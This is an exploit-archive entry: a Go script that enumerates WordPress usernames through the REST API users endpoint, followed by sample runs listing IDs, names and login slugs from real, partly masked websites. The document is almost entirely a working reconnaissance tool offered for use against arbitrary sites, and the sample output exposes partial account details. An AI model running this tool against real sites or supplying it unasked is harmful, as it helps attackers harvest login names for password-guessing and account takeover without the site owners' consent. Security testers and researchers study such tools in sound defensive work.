// Exploit Title: wordpress username enumerator
// Date: 08-october-2020
// Exploit Author: joseph
// Vendor Homepage: wordpress

// Version: 5.1.6 to 5.5.1
// Tested on: Apache
package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"text/tabwriter"
)

func cool() string {
	// tested on version 5.1.6
	fmt.Println("Enter the Wordpress Website: ")
	var scan string
	fmt.Scanln(&scan)
	res, err := http.Get(
		"https://" + scan,
	)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println(" [+] Enumeration Under Progress")
	k := res.Header.Get("Link")
	if len(k) == 0 {
		simple()
	} else {
		split := strings.Split(k, ";")
		new := split[0]
		link := new[1 : len(new)-2]
		var data interface{}
		r, _ := http.Get(link)
		defer r.Body.Close()
		body, _ := ioutil.ReadAll(r.Body)
		json.Unmarshal(body, &data)
		imp := data.(map[string]interface{})["routes"].(map[string]interface{})["/wp/v2/users"].(map[string]interface{})["_links"].(map[string]interface{})["self"]
		return imp.(string)
	}
	return "trying"

}

func simple() {
	// for wordpress version 5.5.1 latest
	wid := new(tabwriter.Writer)
	wid.Init(os.Stdout, 8, 8, 0, '\t', 0)
	defer wid.Flush()
	fmt.Println("retrying on version >>>")
	fmt.Println("Enter the Wordpress Website: ")
	var scan string
	fmt.Scanln(&scan)
	resp, _ := http.Get("https://" + scan + "/wp-json/wp/v2/users")
	simvalid, _ := ioutil.ReadAll(resp.Body)
	strl1 := string(simvalid)
	var sim []map[string]interface {
	}
	if err := json.Unmarshal([]byte(strl1), &sim); err != nil {
		panic(err)
	}
	fmt.Fprintf(wid, "\n %s\t%s\t%s\t", "ID", "Name", "User Name")
	fmt.Fprintf(wid, "\n %s\t%s\t%s\t", "----", "----", "----")
	for x := 0; x < len(sim); x++ {
		fmt.Fprintf(wid, "\n %.0f\t%s\t%s\t\t\t\t\t", sim[x]["id"], sim[x]["name"], sim[x]["slug"])
	}
}

func main() {
	wid := new(tabwriter.Writer)
	wid.Init(os.Stdout, 8, 8, 0, '\t', 0)
	defer wid.Flush()
	inher := cool()
	resp, _ := http.Get(inher)
	valid, _ := ioutil.ReadAll(resp.Body)
	strl := string(valid)
	var val []map[string]interface {
	}
	if err := json.Unmarshal([]byte(strl), &val); err != nil {
		panic(err)
	}
	fmt.Fprintf(wid, "\n %s\t%s\t%s\t", "ID", "Name", "User Name")
	fmt.Fprintf(wid, "\n %s\t%s\t%s\t", "----", "----", "----")
	for x := 0; x < len(val); x++ {
		fmt.Fprintf(wid, "\n %.0f\t%s\t%s\t", val[x]["id"], val[x]["name"], val[x]["slug"])
	}
}
   /*go run wordp.go
     Enter the Wordpress Website: 
     web.***********.com
     [+] Enumeration Under Progress

     ID	      Name			      User Name	
    ----	----		   	       ----		
    4	     SDC  ****		        sd****1		
    3	     S***a R			  08cs****5	
    1	     Web Administrator          horne*******eros
The same output for the latest version but you have to enter the website name twice
     go run wordp.go
     Enter the Wordpress Website
 kar*******.com
 [+] Enumeration Under Progress
 retrying on version >>>
 Enter the Wordpress Website: 
 kar*******.com

 ID	  Name		  User Name	
----	----		  ----		
 5	7*****5000	7******000					
 3	8*******54	8********4					
 4	9*******67	9***5****7
*/
